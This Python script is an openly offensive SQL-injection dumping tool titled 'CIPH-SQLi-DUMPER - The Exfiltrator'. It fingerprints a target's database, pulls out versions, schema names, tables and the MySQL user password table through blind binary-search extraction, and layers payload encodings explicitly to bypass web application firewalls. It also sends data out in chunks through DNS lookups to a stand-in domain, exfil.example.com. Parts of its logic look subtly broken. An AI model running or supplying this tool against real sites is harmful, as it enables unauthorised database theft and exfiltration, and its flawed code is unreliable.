
import asyncio
import base64
import hashlib
import random
import string
import time
import urllib.parse
from datetime import datetime
from typing import List, Dict, Optional, Tuple
import re
import sys
import os
import socket
import struct

try:
    import requests
    import dns.resolver
    import dns.message
    import dns.query
    import dns.rdatatype
except ImportError as e:
    print(f"[X] Missing dependencies: {e}")
    print("[!] Install with: pip install requests dnspython")
    input("[!] Press Enter to continue...")
    sys.exit(1)

class CiphSQLiDumper:
    def __init__(self):
        self.dns_server = "8.8.8.8"
        self.domain = "exfil.example.com"  
        self.max_dns_length = 255
        self.chunk_size = 30  
        
        self.encoders = {
            'url': urllib.parse.quote,
            'hex': lambda x: x.encode().hex(),
            'base64': lambda x: base64.b64encode(x.encode()).decode(),
            'unicode': lambda x: ''.join(f'\\u{ord(c):04x}' for c in x),
            'double_url': lambda x: urllib.parse.quote(urllib.parse.quote(x))
        }
        
        self.sqli_payloads = {
            'mysql': {
                'version': "SELECT VERSION()",
                'databases': "SELECT schema_name FROM information_schema.schemata",
                'tables': "SELECT table_name FROM information_schema.tables WHERE table_schema='{db}'",
                'columns': "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                'data': "SELECT {columns} FROM {table}",
                'count': "SELECT COUNT(*) FROM {table}",
                'users': "SELECT user, password FROM mysql.user"
            },
            'mssql': {
                'version': "SELECT @@VERSION",
                'databases': "SELECT name FROM master..sysdatabases",
                'tables': "SELECT table_name FROM {db}.INFORMATION_SCHEMA.TABLES",
                'columns': "SELECT column_name FROM {db}.INFORMATION_SCHEMA.COLUMNS WHERE table_name='{table}'",
                'data': "SELECT {columns} FROM {table}",
                'count': "SELECT COUNT(*) FROM {table}"
            },
            'postgresql': {
                'version': "SELECT version()",
                'databases': "SELECT datname FROM pg_database",
                'tables': "SELECT tablename FROM pg_tables WHERE schemaname='{db}'",
                'columns': "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
                'data': "SELECT {columns} FROM {table}",
                'count': "SELECT COUNT(*) FROM {table}"
            }
        }
        
        self.time_patterns = [
            "WAITFOR DELAY '0:0:{delay}'",
            "pg_sleep({delay})",
            "SLEEP({delay})",
            "SELECT BENCHMARK({delay},MD5(1))",
            "SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C"
        ]
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
    def encode_payload(self, payload: str, encoding_layers: List[str]) -> str:
        """Apply multiple encoding layers to bypass WAF"""
        encoded = payload
        for encoder_name in encoding_layers:
            if encoder_name in self.encoders:
                encoded = self.encoders[encoder_name](encoded)
        return encoded
        
    def create_sqli_payload(self, base_query: str, injection_point: str = "'") -> str:
        """Create SQL injection payload with various techniques"""
        payloads = [
            f"{injection_point} UNION SELECT {base_query}--",
            f"{injection_point}) UNION SELECT {base_query}--",
            f"{injection_point}')) UNION SELECT {base_query}--",
            f"*/ UNION SELECT {base_query}--",
            f"/*! UNION SELECT {base_query}*/--",
            f"{injection_point} AND (SELECT {base_query})--"
        ]
        return random.choice(payloads)
        
    def binary_search_extract(self, url: str, param: str, query: str, max_length: int = 100) -> str:
        """Extract data using binary search to reduce time by 50%"""
        result = ""
        
        for position in range(1, max_length + 1):
            low, high = 32, 126  
            
            while low <= high:
                mid = (low + high) // 2
                char_query = f"ASCII(SUBSTRING(({query}),{position},1))>{mid}"
                payload = self.create_sqli_payload(char_query)
                
                test_url = f"{url}?{param}={payload}"
                
                try:
                    start_time = time.time()
                    response = self.session.get(test_url, timeout=10)
                    response_time = time.time() - start_time
                    
                    if response_time > 2:  
                        low = mid + 1
                    else:
                        high = mid - 1
                        
                except Exception:
                    high = mid - 1
                    
            if low > 126:
                break  
                
            result += chr(low)
            print(f"\r[*] Extracted: {result}", end="", flush=True)
            
        return result
        
    def dns_exfiltrate_data(self, data: str, subdomain_prefix: str = "exfil") -> bool:
        """Exfiltrate data through DNS queries to bypass WAF"""
        try:
            chunks = [data[i:i+self.chunk_size] for i in range(0, len(data), self.chunk_size)]
            
            for i, chunk in enumerate(chunks):
                encoded_chunk = base64.b64encode(chunk.encode()).decode()
                encoded_chunk = encoded_chunk.replace('+', '-').replace('/', '_').replace('=', '')
                
                subdomain = f"{subdomain_prefix}-{i:03d}-{encoded_chunk}.{self.domain}"
                
                try:
                    resolver = dns.resolver.Resolver()
                    resolver.nameservers = [self.dns_server]
                    resolver.timeout = 5
                    resolver.lifetime = 5
                    
                    answer = resolver.resolve(subdomain, 'A')
                    print(f"[*] DNS exfiltration successful for chunk {i}")
                    
                except (dns.resolver.NXDOMAIN, dns.resolver.Timeout):
                    print(f"[*] DNS exfiltration sent for chunk {i} (expected NXDOMAIN)")
                    
                except Exception as e:
                    print(f"[!] DNS exfiltration failed for chunk {i}: {e}")
                    return False
                    
                time.sleep(0.1)  
                
            return True
            
        except Exception as e:
            print(f"[!] DNS exfiltration error: {e}")
            return False
            
    def create_custom_payload(self, query: str, encoding: str = "mixed") -> str:
        """Create custom multi-encoded payload"""
        if encoding == "mixed":
            layers = random.sample(['url', 'hex', 'base64', 'unicode'], k=2)
            return self.encode_payload(query, layers)
        elif encoding in self.encoders:
            return self.encoders[encoding](query)
        else:
            return query
            
    def detect_database_type(self, url: str, param: str) -> Optional[str]:
        """Detect database type using various techniques"""
        detection_payloads = {
            'mysql': ["SELECT VERSION()", "SELECT @@version_comment"],
            'mssql': ["SELECT @@VERSION", "SELECT DB_NAME()"],
            'postgresql': ["SELECT version()", "SELECT current_database()"],
            'oracle': ["SELECT banner FROM v$version", "SELECT user FROM dual"]
        }
        
        for db_type, queries in detection_payloads.items():
            for query in queries:
                payload = self.create_sqli_payload(query)
                test_url = f"{url}?{param}={payload}"
                
                try:
                    response = self.session.get(test_url, timeout=10)
                    
                    if db_type == 'mysql' and any(x in response.text.lower() for x in ['mysql', 'mariadb']):
                        return db_type
                    elif db_type == 'mssql' and any(x in response.text.lower() for x in ['microsoft', 'sql server']):
                        return db_type
                    elif db_type == 'postgresql' and any(x in response.text.lower() for x in ['postgresql', 'postgres']):
                        return db_type
                    elif db_type == 'oracle' and any(x in response.text.lower() for x in ['oracle', 'ora-']):
                        return db_type
                        
                except Exception:
                    continue
                    
        return None
        
    def extract_database_info(self, url: str, param: str, db_type: str) -> Dict:
        """Extract comprehensive database information"""
        info = {
            'version': '',
            'databases': [],
            'tables': {},
            'columns': {},
            'data': {}
        }
        
        payloads = self.sqli_payloads.get(db_type, {})
        
        if 'version' in payloads:
            print("[*] Extracting database version...")
            info['version'] = self.binary_search_extract(url, param, payloads['version'], 50)
            print(f"\n[+] Version: {info['version']}")
            
        if 'databases' in payloads:
            print("\n[*] Extracting databases...")
            db_query = payloads['databases']
            databases = self.extract_multiple_rows(url, param, db_query)
            info['databases'] = databases
            print(f"[+] Found {len(databases)} databases")
            
        for db in info['databases'][:3]:  
            if 'tables' in payloads:
                print(f"\n[*] Extracting tables for database: {db}")
                table_query = payloads['tables'].format(db=db)
                tables = self.extract_multiple_rows(url, param, table_query)
                info['tables'][db] = tables
                print(f"[+] Found {len(tables)} tables in {db}")
                
        return info
        
    def extract_multiple_rows(self, url: str, param: str, query: str, limit: int = 10) -> List[str]:
        """Extract multiple rows using LIMIT and concatenation"""
        results = []
        
        for i in range(limit):
            limited_query = query
            if 'LIMIT' not in query.upper():
                limited_query = f"{query} LIMIT {i},1"
            else:
                limited_query = f"{query} OFFSET {i} LIMIT 1"
                
            data = self.binary_search_extract(url, param, limited_query, 100)
            if data and data not in results:
                results.append(data)
            else:
                break
                
        return results
        
    def dump_table_data(self, url: str, param: str, table: str, columns: List[str], db_type: str) -> List[Dict]:
        """Dump data from a specific table"""
        print(f"[*] Dumping data from table: {table}")
        
        payloads = self.sqli_payloads.get(db_type, {})
        if 'count' in payloads:
            count_query = payloads['count'].format(table=table)
            row_count = self.binary_search_extract(url, param, count_query, 10)
            print(f"[*] Table has approximately {row_count} rows")
            
        columns_str = ', '.join(columns)
        if 'data' in payloads:
            data_query = payloads['data'].format(columns=columns_str, table=table)
            
            data = []
            for i in range(min(10, int(row_count) if row_count.isdigit() else 10)):
                limited_query = f"{data_query} LIMIT {i},1"
                row_data = self.binary_search_extract(url, param, limited_query, 200)
                if row_data:
                    values = row_data.split('|')  
                    row_dict = dict(zip(columns, values))
                    data.append(row_dict)
                    
            return data
            
        return []
        
    def save_dump(self, data: Dict, filename: str = None) -> str:
        """Save dump to file"""
        if filename is None:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"sqli_dump_{timestamp}.json"
            
        import json
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2, default=str)
            
        print(f"[+] Dump saved to: {filename}")
        return filename
        
    def interactive_mode(self):
        """Interactive mode for manual SQL injection testing"""
        print("\n" + "="*60)
        print("CIPH-SQLi-DUMPER - Interactive Mode")
        print("="*60)
        
        url = input("[?] Target URL: ").strip()
        param = input("[?] Vulnerable parameter: ").strip()
        
        print("\n[*] Detecting database type...")
        db_type = self.detect_database_type(url, param)
        
        if not db_type:
            db_type = input("[!] Could not detect database. Enter manually (mysql/mssql/postgresql/oracle): ").strip().lower()
            
        print(f"[*] Using database type: {db_type}")
        
        while True:
            print("\nOptions:")
            print("1. Extract database info")
            print("2. Custom query")
            print("3. DNS exfiltration")
            print("4. Time-based extraction")
            print("5. Exit")
            
            choice = input("[?] Select option: ").strip()
            
            if choice == "1":
                info = self.extract_database_info(url, param, db_type)
                self.save_dump(info)
                
            elif choice == "2":
                query = input("[?] Enter SQL query: ").strip()
                result = self.binary_search_extract(url, param, query, 200)
                print(f"\n[+] Result: {result}")
                
            elif choice == "3":
                data = input("[?] Enter data to exfiltrate: ").strip()
                self.dns_exfiltrate_data(data)
                
            elif choice == "4":
                query = input("[?] Enter time-based query: ").strip()
                result = self.binary_search_extract(url, param, query, 200)
                print(f"\n[+] Result: {result}")
                
            elif choice == "5":
                break
                
    def run(self):
        """Main execution"""
        try:
            print("\n" + "="*60)
            print("CIPH-SQLi-DUMPER - The Exfiltrator")
            print("="*60)
            
            mode = input("[?] Mode (auto/interactive): ").strip().lower()
            
            if mode == "interactive":
                self.interactive_mode()
            else:
                url = input("[?] Target URL: ").strip()
                param = input("[?] Vulnerable parameter: ").strip()
                
                print("[*] Starting automated SQL injection dump...")
                
                db_type = self.detect_database_type(url, param)
                if not db_type:
                    print("[!] Could not detect database type")
                    return
                    
                print(f"[*] Detected database: {db_type}")
                
                info = self.extract_database_info(url, param, db_type)
                self.save_dump(info)
                
        except KeyboardInterrupt:
            print("\n[!] Operation interrupted by user")
        except Exception as e:
            print(f"[!] Error: {e}")
        finally:
            input("\n[!] Press Enter to continue...")

def main():
    """Entry point"""
    dumper = CiphSQLiDumper()
    dumper.run()

if __name__ == "__main__":
    main()
